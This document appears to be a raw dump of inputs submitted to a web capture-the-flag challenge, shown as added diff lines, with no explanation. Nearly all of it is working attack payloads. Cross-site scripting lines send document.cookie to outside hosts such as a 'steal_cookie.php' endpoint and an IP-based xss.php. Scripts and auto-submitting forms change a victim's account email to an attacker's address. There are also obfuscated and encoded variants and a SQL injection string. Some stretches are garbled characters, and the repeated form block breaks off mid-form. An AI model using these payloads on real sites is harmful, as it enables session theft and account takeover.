+ <img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp;xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=mikun1993%40gmail.com&confirm=Change+Email');"/>
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp;xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=nguyenvuhoang%40ubuntu-vn.org&confirm=Change+Email');"/>
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp;xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=nguyenvuhoang%40ubuntu-vn.org&confirm=Change+Email');"/>
+<script>alert('abc');</script>
+PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL2tpbmhzYW8uY29tL2luZGV4Mi5odG1sJzwvc2NyaXB0PgoK
+<script>location.href = 'http://http://cuocdoiquadep.p.ht/fake.php?cookie='+document.cookie;</script>
+<script>document.location='http://kinhsao.com/index2.html'</script>
+<script>document.location='http://kinhsao.com/steal_cookie.php'+document.cookie</script>
+
+<script>document.location='http://kinhsao.com/steal_cookie.php'+document.cookie;</script>
+F33db4ch
+<script>document.location='http://kinhsao.com/steal_cookie.php'+document.cookie;</script>
+F33db4ck
+<script>document.location='http://kinhsao.com/steal_cookie.php?cookie='+document.cookie;</script>
+<script>document.location='http://kinhsao.com/index2.html';</script>
+mkobilev@gmail.com
+<script>document.location='http://kinhsao.com/index2.html'</script>
+<script>document.location='http://kinhsao.com/index2.html';</script>
+<script>document.location='http://kinhsao.com/index2.html'</script>
+'or 1=1 
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png
+" onload="window.location.href='http://pookami.freevnn.com/cookie.php?cookie='+document.cookie"></img>
+http://httpz.ru/ndx56mcsfip.gif
+<script>document.location='http://kinhsao.com/index3.html';</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<script>document.location='http://kinhsao.com/index3.html'</script>
+<script>document.location='http://kinhsao.com/index2.html';</script>
+<script>document.location='http://kinhsao.com/index2.html'</script>
+"> <script>alert('aaa')</script>
+test
+"> <script>alert('aaa')</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+111111111111111
+<script>alert(/xss/);</script>
+
+12121
+∂∫%¢Z
+<dsafkjsdahfkjsda>
+
+
+÷äı
+<script>alert(1)</script>
+´
+´™¡
+´™¡Í∞
+´™¡Í∞z¨
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+ // Â‰ËÂÍÚ ˜ÂÂÁ 3 ÒÂÍ.
+    var URL = "http://images.cards.mail.ru/11bolprivet.jpg"
+    var speed = 3000;
+    function reload() {
+    document.location = URL
+    }
+    setTimeout("reload()", speed);
+</script>
+<script>document.location='http://kinhsao.com/index2.html'</script>
+<script>document.location='http://kinhsao.com/index2.html';</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+ // Â‰ËÂÍÚ ı|9y»»<yzãÉBàò\àTìHöãÀ⁄[XYŸ\Àòÿ\ôÀõXZ[úùKÃLXõ€ö]ô]öú»ÉBàò\à‹YYHÃ√Bàù[ò›[€àô[ÿY
+
+H√Bàÿ›[Y[ùõÿÿ][€àHTìBàCBàŸ][Y[›]
+úô[ÿY
+
+Hã‹YY
+N√Bè‹ÿ‹ö\
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+ // Â‰ËÂÍÚ ı|9y»»<yzãÉBàò\àTìHöãÀ⁄[XYŸ\Àòÿ\ôÀõXZ[úùKÃLXõ€ö]ô]öú»ÉBàò\à‹YYHÃ√Bàù[ò›[€àô[ÿY
+
+H√Bàÿ›[Y[ùõÿÿ][€àHTìBàCBàŸ][Y[›]
+úô[ÿY
+
+Hã‹YY
+N√Bè‹ÿ‹ö\
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+javascript:document.write('<script>img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;var URL = "http://images.cards.mail.ru/11bolprivet.jpg";var speed = 8000;function reload() {document.location = URL}setTimeout("reload()", speed);</script>')
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+ // Â‰ËÂÍÚ ı|9y»»<yzãÉBàò\àTìHöãÀ⁄[XYŸ\Àòÿ\ôÀõXZ[úùKÃLXõ€ö]ô]öú»ÉBàò\à‹YYHÃ√Bàù[ò›[€àô[ÿY
+
+H√Bàÿ›[Y[ùõÿÿ][€àHTìBàCBàŸ][Y[›]
+úô[ÿY
+
+Hã‹YY
+N√Bè‹ÿ‹ö\
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<html>
+<head>
+</head>
+<body>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+</body>
+</html>
+
+<html>
+<head>
+</head>
+<body>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+</body>
+</html>
+
+
+<script>alert(document.cookie) </script>
+
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png
+" onload="window.location.href='http://pookamin.freevnn.com/change.html'"></img>
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp=new XMLHttpRequest();xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=nguyenvuhoang%40ubuntu-vn.org&confirm=Change+Email');xmlhttp.send();"/>
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp=new XMLHttpRequest();xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=nguyenvuhoang%40ubuntu-vn.org&confirm=Change+Email');xmlhttp.send();"/>
+<img src="" onload="window.location.href='http://pookami.freevnn.com/change.html'"></img>
+<script>location.href="http://lolteam.org"</script>
+<script type="text/javascript">
+
+function SendPost() {
+	    $$a({
+	        type:'post',
+	        url:'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	        data:{'password':'', 'newpassword':'', 'email':'neir0ctf@gmail.com', 'confirm': 'Change Email'  },
+	        response:'text',
+	        success:function (data) {
+	            $$('result',$$('result').innerHTML+'<br />'+data);
+	        }
+	    });
+	}
+SendHead()
+</script>
+<script>window.location=îhttp://localhost:180/xss.php?cookie="document.cookie"</script>
+testfb
+<script>
+  window.location.assign("http://lolteam.org");
+</script>
+<script>
+document.forms[0].elements[2].value='wasmaro88@wp.pl'
+document.forms[0].elements[4].click();
+</script>
+<script>window.location="http://117.0.179.106:180/xss.php?cookie="document.cookie</script>
+<script>window.location="http://117.0.179.106:180/xss.php?cookie="document.cookie</script>
+<script type="text/javascript" src="http://scriptjava.net/source/scriptjava/scriptjava.js"></script>
+<script type="text/javascript">
+function SendPost() {
+	    $$a({
+	        type:'post',
+	        url:'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	        data:{'password':'', 'newpassword':'', 'email':'neir0ctf@gmail.com', 'confirm': 'Change Email'  },
+	        response:'text',
+	        success:function (data) {
+	            $$('result',$$('result').innerHTML+'<br />'+data);
+	        }
+	    });
+	}
+SendHead()
+</script>
+<script type="text/javascript" src="http://scriptjava.net/source/scriptjava/scriptjava.js"></script>
+<script type="text/javascript">
+function SendPost() {
+	    $$a({
+	        type:'post',
+	        url:'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	        data:{'password':'', 'newpassword':'', 'email':'neir0ctf@gmail.com', 'confirm': 'Change Email'  },
+	        response:'text',
+	        success:function (data) {
+	            $$('result',$$('result').innerHTML+'<br />'+data);
+	        }
+	    });
+	}
+SendHead()
+</script>
+<script type="text/javascript" src="http://scriptjava.net/source/scriptjava/scriptjava.js"></script>
+<script type="text/javascript">
+function SendPost() {
+	    $$a({
+	        type:'post',
+	        url:'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	        data:{'password':'', 'newpassword':'', 'email':'neir0ctf@gmail.com', 'confirm': 'Change Email'  },
+	        response:'text',
+	        success:function (data) {
+	            $$('result',$$('result').innerHTML+'<br />'+data);
+	        }
+	    });
+	}
+SendHead()
+</script>
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="window.location.href='http://pookami.freevnn.com/change.html'"></img>
+<script>
+img = new Image(); img.src = "http://httpz.ru/ndx56mcsfip.gif?"+document.cookie;
+</script>
+<script type="text/javascript" src="http://scriptjava.net/source/scriptjava/scriptjava.js"></script>
+<script type="text/javascript">
+function SendPost() {
+	    $$a({
+	        type:'post',
+	        url:'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	        data:{'password':'', 'newpassword':'', 'email':'neir0ctf@gmail.com', 'confirm': 'Change Email'  },
+	        response:'text',
+	        success:function (data) {
+	            $$('result',$$('result').innerHTML+'<br />'+data);
+	        }
+	    });
+	}
+SendHead()
+</script>
+<script>document.location="http://117.0.179.106:180/xss.php?cookie="+document.cookie
+</script>
+"><script>window.location.assign("http://lolteam.org")</script>
+F33db4k
+<script>document.location="http://117.0.179.106:180/xss.php?cookie="+document.cookie
+</script>
+<script>
+var xhr=new XMLHttpRequest();
+xhr.open('POST','?act=change',false);
+xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+xhr.send('password=&newpassword=&email=wasmaro88@wp.pl&confirm=Change+Email');
+</script>
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
+	<script>
+	var signature = '';
+	var url = 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change';
+	 
+$.ajax(url, {
+	type: "POST",
+	async: false,
+	success: function(data, status, xhr){
+	signature = xhr.getResponseHeader('X-Redirect-Signature');
+	}
+});
+ 
+$.post(url, {'password':'', 'newpassword':'', 'email':'neir0ctf@gmail.com', 'confirm': 'Change Email'  });
+</script>
+<script>document.location="http://117.0.179.106:180/xss.php?cookie="+document.cookie
+</script>
+<script>
+var xhr=new XMLHttpRequest();
+xhr.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',false);
+xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+xhr.send('password=&newpassword=&email=wasmaro88@wp.pl&confirm=Change+Email');
+</script>
+<script>document.location="http://lolteam.org/"
+</script>
+123123123
+<script>alert('XSS was found !');</script>
+String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 32, 119, 97, 115, 32, 102, 111, 117, 110, 100, 32, 33, 39, 41, 59, 60, 47, 115, 99, 114, 105, 112, 116, 62)
+%3Cscript%3Edocument.location%3D%22http%3A%2f%2flolteam.org%2f%22%3C%2fscript%3E
+String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 32, 119, 97, 115, 32, 102, 111, 117, 110, 100, 32, 33, 39, 41, 59, 60, 47, 115, 99, 114, 105, 112, 116, 62)
+<script>
+var xhr=new XMLHttpRequest;
+xhr.open('POST','/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',0);
+xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+xhr.send('password=&newpassword=&email=marek.wasacz.88@gmail.com&confirm=Change+Email');
+</script>
+123
+lol
+<script>alert(123)</script>
+123123123123
+feedback
+1234
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Forgot?" />
+</form>
+<script>
+document.form1.submit();
+document.form2.submit();
+</script>
+<form name="form1" method="POST" action="?act=change">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
+	<input type="email" class="email input" name="email" value="byg.donho@hotmail.com" />
+	<input class="button button-orange" name="confirm" type="submit" value="Change Email" />
+</form>
+
+<form name="form2" method="POST" action="">
+	<input type="password" class="password input" name="password" placeholder="Old Password" />
+	<input type="password" class="password input" name="newpassword" placeholder="New Password" />
